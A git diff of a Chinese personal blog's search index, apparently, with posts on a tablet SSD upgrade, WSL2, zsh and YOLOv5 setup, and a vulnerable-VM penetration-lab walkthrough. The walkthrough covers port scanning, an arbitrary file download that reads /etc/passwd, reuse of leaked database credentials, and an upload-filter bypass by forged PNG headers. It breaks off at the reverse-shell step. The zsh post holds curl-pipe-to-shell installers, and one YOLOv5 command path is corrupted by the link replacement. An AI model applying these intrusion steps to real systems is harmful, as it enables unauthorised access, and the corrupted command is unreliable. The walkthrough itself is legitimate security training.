@@ -5,8 +5,8 @@
     <url>/post/4a17b156.html</url>
     <content><![CDATA[<p>PS：写这篇文章的原因是我在扩展这个平板的硬盘时就踩过坑，而且关于这台平板的文章在网上非常少且有些错误的地方。</p>
 <p>自从需要带着电脑出去干活的频率升高后就一直想搞个win平板玩玩，主要是方便带着出门加轻度办公<del>（其实主要原因是方便玩旮旯给木）</del>。为什么要选择傻多戴呢，无他，就是因为可以扩展硬盘而且二手也不贵（某鱼上1000多一点带键盘拿下，基本上是全新）。</p>
-<h2 id="关于硬盘位"><a href="#关于硬盘位" class="headerlink" title="关于硬盘位"></a>关于硬盘位</h2><p>关于大家最关心的扩展位硬盘的问题，这个硬盘位是wwan口，<strong>不支持sata协议，只支持nvme协议 pcie3.0，并且需要双缺口（B&amp;M key）的硬盘才能插得进去</strong>。规格我选择的是2242的（是短硬盘，平时大家看得多的长硬盘是2280规格的），2230的没试过，貌似也是可以的（别人有成功过）。根据硬盘的螺丝定位口来看，2242是刚刚好的。<br><img src="/image/post1/ae270d110612862760e6b359d714f10a429931853.jpg" alt="硬盘展示"></p>
-<h2 id="速度"><a href="#速度" class="headerlink" title="速度"></a>速度</h2><p>测速大家自己看吧<del>（主硬盘位商家给了一根sata协议的好黑心）</del><br><img src="/image/post1/e29d3ea9d3e14ea0f3912cba53f352ac429931853.png" alt="测速展示"></p>
+<h2 id="关于硬盘位"><a href="#关于硬盘位" class="headerlink" title="关于硬盘位"></a>关于硬盘位</h2><p>关于大家最关心的扩展位硬盘的问题，这个硬盘位是wwan口，<strong>不支持sata协议，只支持nvme协议 pcie3.0，并且需要双缺口（B&amp;M key）的硬盘才能插得进去</strong>。规格我选择的是2242的（是短硬盘，平时大家看得多的长硬盘是2280规格的），2230的没试过，貌似也是可以的（别人有成功过）。根据硬盘的螺丝定位口来看，2242是刚刚好的。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post1/ae270d110612862760e6b359d714f10a429931853.jpg" alt="硬盘展示"></p>
+<h2 id="速度"><a href="#速度" class="headerlink" title="速度"></a>速度</h2><p>测速大家自己看吧<del>（主硬盘位商家给了一根sata协议的好黑心）</del><br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post1/e29d3ea9d3e14ea0f3912cba53f352ac429931853.png" alt="测速展示"></p>
 <p>在这里纠正一点，在别的文章有看到过把ngff和nvme放在一起说的，而实际上ngff和nvme不是并列关系，ngff（Next Generation Form Factor）就是m.2的前称，而nvme是一种传输协议。</p>
 ]]></content>
       <tags>
@@ -14,120 +14,6 @@
         <tag>搞机</tag>
         <tag>win平板</tag>
         <tag>避坑</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>WSL2的安装和简单配置</title>
-    <url>/post/87099e43.html</url>
-    <content><![CDATA[<p>写在前面：本教程使用的是Windows11的系统，不保证Windows10也适用。</p>
-<h2 id="一、为Windows启用Hyper-v虚拟化"><a href="#一、为Windows启用Hyper-v虚拟化" class="headerlink" title="一、为Windows启用Hyper-v虚拟化"></a>一、为Windows启用Hyper-v虚拟化</h2><ul>
-<li><p>按下win键，打开开始菜单，在搜索框中搜索<code>powershell</code>并按下右键选择以管理员身份运行。<br><img src="/image/post2/0865930a85e7def3f66138ae61450941.png" alt="展示"></p>
-</li>
-<li><p>输入命令来执行虚拟化操作：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName $(<span class="string">&quot;Microsoft-Windows-Subsystem-Linux&quot;</span>,<span class="string">&quot;VirtualMachinePlatform&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>  此操作需要重启，若询问是否立即重启执行操作，输入Y并按下回车键即可。</p>
-</li>
-</ul>
-<h2 id="二、设置WSL2默认版本为version2"><a href="#二、设置WSL2默认版本为version2" class="headerlink" title="二、设置WSL2默认版本为version2"></a>二、设置WSL2默认版本为version2</h2><p>在之前的管理员powershell界面输入<code>wsl --set-default-version 2</code>即可，之后可以输入<code>wsl -v</code>来确定版本。<br><img src="/image/post2/168383ad282389c72db900a0869ef219.png" alt="wsl版本"><br>现在win11默认的wsl版本就是2，此操作也可以不做。</p>
-<h2 id="三、下载Linux发行版"><a href="#三、下载Linux发行版" class="headerlink" title="三、下载Linux发行版"></a>三、下载Linux发行版</h2><h3 id="方案一：通过Microsoft-Store来进行下载"><a href="#方案一：通过Microsoft-Store来进行下载" class="headerlink" title="方案一：通过Microsoft Store来进行下载"></a>方案一：通过Microsoft Store来进行下载</h3><p>通过微软商店来下载非常简单，只需要在微软商店搜索对应的Linux发行版的名字即可进行下载。比如这里以下载ubuntu为例：<br><img src="/image/post2/d573d3eb16225db1e4a8dcf3c017d7b4.png" alt="Ubuntu"></p>
-<h3 id="方案二：通过命令行来进行安装-推荐"><a href="#方案二：通过命令行来进行安装-推荐" class="headerlink" title="方案二：通过命令行来进行安装(推荐)"></a>方案二：通过命令行来进行安装(推荐)</h3><ul>
-<li>使用<code>wsl -l -o</code>命令来查看当前可用的发行版。<br><img src="/image/post2/6b3a505f144d94c59fe6fb4d9589e697.png" alt="可用列表"></li>
-<li>使用<code>wsl --install -d &lt;distribution name&gt;</code>命令来下载指定的Linux发行版，这里的distribution name就是指上面那个操作中的第一列列出来的名称。</li>
-</ul>
-<p>等待耐心下载完并弹出相应提示之后，安装过程就完成了。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输出类似如下信息则启动成功</span></span><br><span class="line">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.153.1-microsoft-standard-WSL2 x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br></pre></td></tr></table></figure>
-
-<h2 id="四、-wslconfig文件设置"><a href="#四、-wslconfig文件设置" class="headerlink" title="四、.wslconfig文件设置"></a>四、.wslconfig文件设置</h2><ul>
-<li><p>进入<code>C:/Users/Username/</code>目录，如果当前目录不存在名为<code>.wslconfig</code>的文件，则手动创建一个。</p>
-</li>
-<li><p>用记事本打开<code>.wslconfig</code>文件并输入以下内容：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[experimental]</span><br><span class="line">autoMemoryReclaim=gradual  </span><br><span class="line">networkingMode=mirrored</span><br><span class="line">dnsTunneling=<span class="literal">true</span></span><br><span class="line">firewall=<span class="literal">true</span></span><br><span class="line">autoProxy=<span class="literal">true</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>这个操作之后可以使用<code>ip addr</code>命令查看ip地址并和在<code>powershell</code>中输入<code>ipconfig</code>后的地址进行对比，如若一样则网络模式修改成功。此外，上面的功能是Windows内部版本19041及更高版本中作为wsl2运行的发行版特有的，可以自行去看官网以了解更多功能<a href="https://learn.microsoft.com/en-us/windows/wsl/wsl-config#configuration-options">WSL配置</a>。</p>
-<h3 id="clash接管wsl2网络"><a href="#clash接管wsl2网络" class="headerlink" title="clash接管wsl2网络"></a>clash接管wsl2网络</h3><p>让clash接管wsl的网络，需要先在clash中打开<code>Allow LAN</code>功能。<br><img src="/image/post2/clash1.png" alt="clash"></p>
-<h4 id="方案一-你能使用wsl2的实验性功能"><a href="#方案一-你能使用wsl2的实验性功能" class="headerlink" title="方案一(你能使用wsl2的实验性功能)"></a>方案一(你能使用wsl2的实验性功能)</h4><p>确保上述的操作无误，输入<code>wget www.google.com</code>来确认clash确实已经接管了wsl的网络(此操作需要在Linux的不需要root写权限的目录下进行)。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; wget www.google.com</span><br><span class="line"></span><br><span class="line">--2025-01-21 22:18:49--  http://www.google.com/</span><br><span class="line">Connecting to 127.0.0.1:7890... connected.</span><br><span class="line">Proxy request sent, awaiting response... 200 OK</span><br><span class="line">Length: unspecified [text/html]</span><br><span class="line">Saving to: ‘index.html’</span><br><span class="line"></span><br><span class="line">index.html                        [ &lt;=&gt;                                              ]  19.35K  --.-KB/s    <span class="keyword">in</span> 0.05s</span><br><span class="line"></span><br><span class="line">2025-01-21 22:18:49 (376 KB/s) - ‘index.html’ saved [19818]</span><br></pre></td></tr></table></figure>
-
-<h4 id="方案二-你不能使用wsl2的实验性功能"><a href="#方案二-你不能使用wsl2的实验性功能" class="headerlink" title="方案二(你不能使用wsl2的实验性功能)"></a>方案二(你不能使用wsl2的实验性功能)</h4><p>这里借鉴了某<a href="https://eastmonster.github.io/2022/10/05/clash-config-in-wsl/">大神</a>的方案，若你的wsl版本或者windows版本不能使用上面的配置，将<code>.wslconfig</code>中的内容改为</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[wsl2]</span><br><span class="line">dnsTunneling=<span class="literal">false</span></span><br></pre></td></tr></table></figure>
-
-<p>之后编辑Linux根目录下的<code>.bashrc</code>文件，加入以下三行内容</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">host_ip=$(<span class="built_in">cat</span> /etc/resolv.conf |grep <span class="string">&quot;nameserver&quot;</span> |<span class="built_in">cut</span> -f 2 -d <span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;http://<span class="variable">$host_ip</span>:[端口]&quot;</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">&quot;http://<span class="variable">$host_ip</span>:[端口]&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>这里的端口就是clash的port，如上面我的截图中clash的端口是7890(一般默认就是7890)。完成后输入<code>source ~/.bashrc</code>来让配置生效，可以输入<code>echo $http_proxy</code>来验证是否成功。</p>
-<h2 id="五、更换软件源"><a href="#五、更换软件源" class="headerlink" title="五、更换软件源"></a>五、更换软件源</h2><p>根据你使用的Linux发行版直接上网搜索相应的镜像源即可，这里给出一个汇总链接<a href="https://segmentfault.com/a/1190000000375848">镜像源</a>。复制相应的镜像源后，直接进行修改即可。这里以debian12更换清华源为例。</p>
-<ul>
-<li><p>访问<a href="https://mirrors.tuna.tsinghua.edu.cn/help/debian/">debian清华镜像源</a>(网址中的debian可换成你的Linux发行版)并复制软件源。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware</span></span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware</span></span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换</span></span><br><span class="line">deb https://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>备份文件并修改文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 备份源文件</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> /etc/apt/sources.list /etc/apt/sources.list.backup</span><br><span class="line"><span class="comment"># 修改文件</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">touch</span> /etc/apt/sources.list</span><br><span class="line"><span class="built_in">sudo</span> vi /etc/apt/sources.list <span class="comment"># 将复制内容粘贴进去 </span></span><br></pre></td></tr></table></figure>
-
-<p>相信vim操作就不用教了吧，这里也可以使用你更熟悉的编辑器进行修改。</p>
-</li>
-</ul>
-<p>最后输入<code>sudo apt update</code>和<code>sudo apt upgrade</code>命令即可验证软件源是否修改成功。</p>
-]]></content>
-      <tags>
-        <tag>WSL2</tag>
-        <tag>Windows11</tag>
-        <tag>Linux</tag>
-        <tag>教程</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>zsh的安装和简单配置</title>
-    <url>/post/88f7f195.html</url>
-    <content><![CDATA[<p>写在前面：本教程使用的是WSL2(Debian系统)，使用ArchLinux系或者RedHat系的操作系统可能在下面的操作中有些许不同之处。zsh有比bash更加丰富的扩展功能，在可自定义化和补全功能上都比bash要强大很多<del>(最重要的是zsh比bash的prompt好看多了)</del>。</p>
-<h2 id="一、下载zsh并设置其为默认shell"><a href="#一、下载zsh并设置其为默认shell" class="headerlink" title="一、下载zsh并设置其为默认shell"></a>一、下载zsh并设置其为默认shell</h2><ul>
-<li>下载zsh<br>下载zsh非常之简单，很多版本的Linux都提供了zsh的预编译包，可以通过系统的包管理器安装。</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install zsh</span><br></pre></td></tr></table></figure>
-
-<p>如果你的Linux使用的是其他包管理工具，比如yum或是pacman，请自行查找教程。</p>
-<ul>
-<li><p>将zsh设置为默认shell<br>首先要检查zsh是否安装成功，输入命令<code>zsh --version</code>后如果有类似于下面的输出，那说明安装成功了。<br><img src="/image/post3/dd48fdedf7063619e1708387b1d60e71.png" alt="zsh-version"><br>之后就是输入命令让zsh成为默认shell。</p>
-  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chsh -s /usr/bin/zsh</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>至此，zsh的下载安装已经完毕。</p>
-<h2 id="二、下载oh-my-zsh并进行插件和主题的配置"><a href="#二、下载oh-my-zsh并进行插件和主题的配置" class="headerlink" title="二、下载oh-my-zsh并进行插件和主题的配置"></a>二、下载oh-my-zsh并进行插件和主题的配置</h2><p>oh-my-zsh是一个开源的zsh配置管理框架，旨在帮助用户快速上手zsh，并通过丰富的插件和主题让命令行体验更加高效、美观和个性化。<del>(上述内容由ai生成)</del></p>
-<ul>
-<li><p>下载oh-my-zsh<br>如果你在国内，可以使用gitee的镜像</p>
-  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://gitee.com/shmhlsy/oh-my-zsh-install.sh/raw/master/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>  如果你在国外或者就是想用github，使用以下命令：</p>
-  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>下载powerlevel10k<br>powerlevel10k是一个自定义化程度相当之高且方便使用的主题配置工具，和上面的一样，可以选择从github或者gitee来下载：</p>
-  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-<span class="variable">$HOME</span>/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br></pre></td></tr></table></figure>
-
-  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://gitee.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-<span class="variable">$HOME</span>/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br></pre></td></tr></table></figure>
-
-<p>  下载完毕之后，编辑<code>~/.zshrc</code>文件，找到以下行并修改：</p>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;主题名称&quot;</span><br><span class="line">#修改为：ZSH_THEME=&quot;powerlevel10k/powerlevel10k&quot;</span><br></pre></td></tr></table></figure>
-
-<p>  保存并退出后执行命令<code>source ~/.zshrc</code>后会让你自定义prompt外观。<br>  如果你之后又想进行外观的修改，可以输入命令：</p>
-  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">p10k configure</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>下载两个常用插件<br>先编辑<code>~/.zshrc</code>文件，找到以下行并修改：</p>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugins=(git) </span><br><span class="line">#修改为：plugins=(git zsh-autosuggestions zsh-syntax-highlighting)</span><br></pre></td></tr></table></figure>
-
-<p>  然后下载两个插件：</p>
-  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>
-
-  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions.git ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>
-
-<p>  最后仍然是执行命令<code>source ~/.zshrc</code>使插件生效。</p>
-</li>
-</ul>
-<p>以上就是zsh的安装和简单的配置，放一个我配置完的zsh的效果图：<br><img src="/image/post3/95f4d3600abefc9525dc9d907f96f21f.png" alt="zsh-example"></p>
-]]></content>
-      <tags>
-        <tag>Linux</tag>
-        <tag>教程</tag>
-        <tag>zsh</tag>
-        <tag>美化</tag>
       </tags>
   </entry>
   <entry>
@@ -176,7 +62,7 @@
   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/ultralytics/yolov5/releases/download/v6.2/yolov5s.pt</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>验证安装：运行一个简单的推理脚本来验证YOLOv5是否正确安装：</p>
-  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python detect.py --<span class="built_in">source</span> ./data/images/ --weights ./yolov5s.pt</span><br></pre></td></tr></table></figure></li>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python detect.py --<span class="built_in">source</span> ./datahttps://my-github-blog.oss-cn-hangzhou.aliyuncs.coms/ --weights ./yolov5s.pt</span><br></pre></td></tr></table></figure></li>
 </ul>
 <h2 id="5-相关的官方链接"><a href="#5-相关的官方链接" class="headerlink" title="5.相关的官方链接"></a>5.相关的官方链接</h2><ul>
 <li>源仓库的github链接：<a href="https://github.com/ultralytics/yolov5">yolov5源仓库</a></li>
@@ -185,8 +71,62 @@
 ]]></content>
       <tags>
         <tag>Linux</tag>
-        <tag>教程</tag>
         <tag>yolov</tag>
+        <tag>教程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>zsh的安装和简单配置</title>
+    <url>/post/88f7f195.html</url>
+    <content><![CDATA[<p>写在前面：本教程使用的是WSL2(Debian系统)，使用ArchLinux系或者RedHat系的操作系统可能在下面的操作中有些许不同之处。zsh有比bash更加丰富的扩展功能，在可自定义化和补全功能上都比bash要强大很多<del>(最重要的是zsh比bash的prompt好看多了)</del>。</p>
+<h2 id="一、下载zsh并设置其为默认shell"><a href="#一、下载zsh并设置其为默认shell" class="headerlink" title="一、下载zsh并设置其为默认shell"></a>一、下载zsh并设置其为默认shell</h2><ul>
+<li>下载zsh<br>下载zsh非常之简单，很多版本的Linux都提供了zsh的预编译包，可以通过系统的包管理器安装。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install zsh</span><br></pre></td></tr></table></figure>
+
+<p>如果你的Linux使用的是其他包管理工具，比如yum或是pacman，请自行查找教程。</p>
+<ul>
+<li><p>将zsh设置为默认shell<br>首先要检查zsh是否安装成功，输入命令<code>zsh --version</code>后如果有类似于下面的输出，那说明安装成功了。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post3/dd48fdedf7063619e1708387b1d60e71.png" alt="zsh-version"><br>之后就是输入命令让zsh成为默认shell。</p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chsh -s /usr/bin/zsh</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>至此，zsh的下载安装已经完毕。</p>
+<h2 id="二、下载oh-my-zsh并进行插件和主题的配置"><a href="#二、下载oh-my-zsh并进行插件和主题的配置" class="headerlink" title="二、下载oh-my-zsh并进行插件和主题的配置"></a>二、下载oh-my-zsh并进行插件和主题的配置</h2><p>oh-my-zsh是一个开源的zsh配置管理框架，旨在帮助用户快速上手zsh，并通过丰富的插件和主题让命令行体验更加高效、美观和个性化。<del>(上述内容由ai生成)</del></p>
+<ul>
+<li><p>下载oh-my-zsh<br>如果你在国内，可以使用gitee的镜像</p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://gitee.com/shmhlsy/oh-my-zsh-install.sh/raw/master/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>  如果你在国外或者就是想用github，使用以下命令：</p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>下载powerlevel10k<br>powerlevel10k是一个自定义化程度相当之高且方便使用的主题配置工具，和上面的一样，可以选择从github或者gitee来下载：</p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-<span class="variable">$HOME</span>/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br></pre></td></tr></table></figure>
+
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://gitee.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-<span class="variable">$HOME</span>/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br></pre></td></tr></table></figure>
+
+<p>  下载完毕之后，编辑<code>~/.zshrc</code>文件，找到以下行并修改：</p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;主题名称&quot;</span><br><span class="line">#修改为：ZSH_THEME=&quot;powerlevel10k/powerlevel10k&quot;</span><br></pre></td></tr></table></figure>
+
+<p>  保存并退出后执行命令<code>source ~/.zshrc</code>后会让你自定义prompt外观。<br>  如果你之后又想进行外观的修改，可以输入命令：</p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">p10k configure</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>下载两个常用插件<br>先编辑<code>~/.zshrc</code>文件，找到以下行并修改：</p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugins=(git) </span><br><span class="line">#修改为：plugins=(git zsh-autosuggestions zsh-syntax-highlighting)</span><br></pre></td></tr></table></figure>
+
+<p>  然后下载两个插件：</p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>
+
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions.git ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>
+
+<p>  最后仍然是执行命令<code>source ~/.zshrc</code>使插件生效。</p>
+</li>
+</ul>
+<p>以上就是zsh的安装和简单的配置，放一个我配置完的zsh的效果图：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post3/95f4d3600abefc9525dc9d907f96f21f.png" alt="zsh-example"></p>
+]]></content>
+      <tags>
+        <tag>Linux</tag>
+        <tag>教程</tag>
+        <tag>zsh</tag>
+        <tag>美化</tag>
       </tags>
   </entry>
   <entry>
@@ -196,27 +136,27 @@
 <h2 id="一、扫描端口"><a href="#一、扫描端口" class="headerlink" title="一、扫描端口"></a>一、扫描端口</h2><p>首先还是尝试非常经典的扫描端口，输入以下命令</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arp-scan -l <span class="comment">#查找靶机ip</span></span><br><span class="line">nmap -p- 10.0.2.13 -sV –min-rate 50000 –min-hostgroup 100 <span class="comment">#查找靶机暴露的端口以及其具体信息</span></span><br></pre></td></tr></table></figure>
 
-<p>发现结果如下：<br><img src="/image/post5/f85375a98414cad4082aca7e49362cb1.png" alt="靶机ip"></p>
+<p>发现结果如下：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/f85375a98414cad4082aca7e49362cb1.png" alt="靶机ip"></p>
 <p>尝试寻找相应的漏洞后(使用<code>searchsploit</code>命令)，没有发现可利用的漏洞，故进行到下一步。</p>
 <h2 id="二、尝试破解登录"><a href="#二、尝试破解登录" class="headerlink" title="二、尝试破解登录"></a>二、尝试破解登录</h2><ul>
 <li>首先尝试使用seclist中提供的目录来进行爆破，但是因为burpsuite没开会员，等待时间非常长，故选择放弃。</li>
-<li>很容易想到经典的目录搜索<code>dirsearch -u 10.0.2.13</code>来寻找泄露的信息，发现了非常多的可用网页：<br><img src="/image/post5/94eeb0452789faa77ff51f5e92fa44ef.png" alt="目录搜索"><br>故对各网页进行尝试，在访问<code>10.0.2.13/test</code>这个网页的时候发现了任意文件下载漏洞，先尝试GET类型的请求方法来进行尝试：<br><img src="/image/post5/50f3881561803610a03c3027d50698ea.png" alt="test.php"><br><img src="/image/post5/bb9faf6ca59c95d0f8865a5fe1d1bd61.png" alt="GET1"><br><img src="/image/post5/d898310f77c3b2c5c622fb872d9b6cbb.png" alt="GET2"><br>发现没有返回结果，故利用burpsuite工具来尝试修改请求类型，将GET请求转化为POST请求，得到如下结果：<br><img src="/image/post5/58b9fe731240af6e6b48f5a7af70aab9.png" alt="POST1"><br>发现成功得到了<code>/etc/passwd</code>里的内容，利用这个工具去查看前面发现的网页的内容，很“幸运”地发现了<code>/c</code>网页里的疑似数据库相关的信息：<br><img src="/image/post5/a10a8561bfe5aa0eaf02c275bf4be1df.png" alt="POST2"><br>将数据库和密码输入到<code>10.0.2.13/phpmy</code>，发现成功登录：<br><img src="/image/post5/3279a1e20775411b56c848434018a9d1.png" alt="数据库登录"><br>在phpmy网页中的auth一栏下发现了疑似网页的登录信息，将用户名和密码输入10.0.2.13这个网页中并发现能成功登录：<br><img src="/image/post5/940af7e60576e421cc8b4bc1605911cb.png" alt="网页登陆1"><br><img src="/image/post5/03c42f4b0972ddddbb21a4b6b8a6dd38.png" alt="网页登陆2"></li>
+<li>很容易想到经典的目录搜索<code>dirsearch -u 10.0.2.13</code>来寻找泄露的信息，发现了非常多的可用网页：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/94eeb0452789faa77ff51f5e92fa44ef.png" alt="目录搜索"><br>故对各网页进行尝试，在访问<code>10.0.2.13/test</code>这个网页的时候发现了任意文件下载漏洞，先尝试GET类型的请求方法来进行尝试：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/50f3881561803610a03c3027d50698ea.png" alt="test.php"><br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/bb9faf6ca59c95d0f8865a5fe1d1bd61.png" alt="GET1"><br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/d898310f77c3b2c5c622fb872d9b6cbb.png" alt="GET2"><br>发现没有返回结果，故利用burpsuite工具来尝试修改请求类型，将GET请求转化为POST请求，得到如下结果：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/58b9fe731240af6e6b48f5a7af70aab9.png" alt="POST1"><br>发现成功得到了<code>/etc/passwd</code>里的内容，利用这个工具去查看前面发现的网页的内容，很“幸运”地发现了<code>/c</code>网页里的疑似数据库相关的信息：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/a10a8561bfe5aa0eaf02c275bf4be1df.png" alt="POST2"><br>将数据库和密码输入到<code>10.0.2.13/phpmy</code>，发现成功登录：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/3279a1e20775411b56c848434018a9d1.png" alt="数据库登录"><br>在phpmy网页中的auth一栏下发现了疑似网页的登录信息，将用户名和密码输入10.0.2.13这个网页中并发现能成功登录：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/940af7e60576e421cc8b4bc1605911cb.png" alt="网页登陆1"><br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/03c42f4b0972ddddbb21a4b6b8a6dd38.png" alt="网页登陆2"></li>
 </ul>
-<h2 id="三、尝试反弹shell"><a href="#三、尝试反弹shell" class="headerlink" title="三、尝试反弹shell"></a>三、尝试反弹shell</h2><p>登陆上这个网页后，发现这个网站有上传图片的功能，很容易想到有可能可以利用的任意文件上传漏洞，先尝试直接上传<code>.php</code>文件，发现它会检查文件类型，将后缀名修改后也不能传输成功。说明网站不只是简单地进行了后缀名的检测，故尝试修改文件头来通过检测。将文件头的十六进制修改为<code>89504e470d0a1a0a</code>发现成功：<br><img src="/image/post5/770356d662f44b87159678359834e39c.png" alt="上传文件"></p>
